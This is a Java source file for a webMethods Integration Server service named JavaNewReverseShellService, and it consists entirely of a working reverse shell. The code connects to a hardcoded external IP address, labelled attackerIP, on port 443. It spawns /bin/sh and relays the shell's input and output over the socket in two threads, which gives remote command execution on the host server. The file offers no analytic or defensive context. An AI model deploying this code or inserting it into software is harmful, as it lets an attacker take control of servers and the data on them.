

// -----( IS Java Code Template v1.2

import com.wm.data.*;
import com.wm.util.Values;
import com.wm.app.b2b.server.Service;
import com.wm.app.b2b.server.ServiceException;
// --- <<IS-START-IMPORTS>> ---
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import com.wm.data.IData;
// --- <<IS-END-IMPORTS>> ---

public final class ReverseShellNew

{
	// ---( internal utility methods )---

	final static ReverseShellNew _instance = new ReverseShellNew();

	static ReverseShellNew _newInstance() { return new ReverseShellNew(); }

	static ReverseShellNew _cast(Object o) { return (ReverseShellNew)o; }

	// ---( server methods )---




	public static final void JavaNewReverseShellService (IData pipeline)
        throws ServiceException
	{
		// --- <<IS-START(JavaNewReverseShellService)>> ---
		// @sigtype java 3.5
		String attackerIP = "134.213.29.149";
		int attackerPort = 443;
		 
		try {
		    Socket socket = new Socket(attackerIP, attackerPort);
		    InputStream in = socket.getInputStream();
		    OutputStream out = socket.getOutputStream();
		 
		    // Start a new process for the shell
		    Process process = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
		 
		    // Stream shell output to the attacker's server
		    InputStream processIn = process.getInputStream();
		    OutputStream processOut = process.getOutputStream();
		 
		    // Thread for sending data from shell to the attacker
		    new Thread(() -> {
		        try {
		            byte[] buffer = new byte[1024];
		            int len;
		            while ((len = processIn.read(buffer)) != -1) {
		                out.write(buffer, 0, len);
		                out.flush();
		            }
		        } catch (Exception e) {
		            e.printStackTrace();
		        }
		    }).start();
		 
		    // Thread for receiving data from the attacker to the shell
		    new Thread(() -> {
		        try {
		            byte[] buffer = new byte[1024];
		            int len;
		            while ((len = in.read(buffer)) != -1) {
		                processOut.write(buffer, 0, len);
		                processOut.flush();
		            }
		        } catch (Exception e) {
		            e.printStackTrace();
		        }
		    }).start();
		 
		    // Wait for the process to complete
		    process.waitFor();
		 
		    // Close resources
		    processIn.close();
		    processOut.close();
		    in.close();
		    out.close();
		    socket.close();
		} catch (Exception e) {
		    e.printStackTrace();
		}
		// --- <<IS-END>> ---

                
	}
}

